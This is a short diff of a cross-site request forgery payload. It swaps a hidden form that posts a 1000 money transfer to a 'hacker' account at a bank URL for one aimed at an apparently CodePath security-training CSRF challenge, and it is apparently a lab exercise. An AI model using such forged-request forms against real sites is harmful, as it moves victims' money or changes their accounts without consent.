@@ -1,6 +1,5 @@
-<form name="csrfForm" action="http://www.secureBank.ie/sendMoney" method="POST">
- <input type="hidden" name="giveMoneyTo" value="hacker" />
- <input type="hidden" name="giveAmount" value="1000" />
+<form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus?userid=81b7468100e5c1e83a9a292c6be0025ecd989c37" method="POST">
+ <input type="hidden" name="giveMoneyTo" value="81b7468100e5c1e83a9a292c6be0025ecd989c37" />
  <input type="submit"/>
 </form>
 <script>
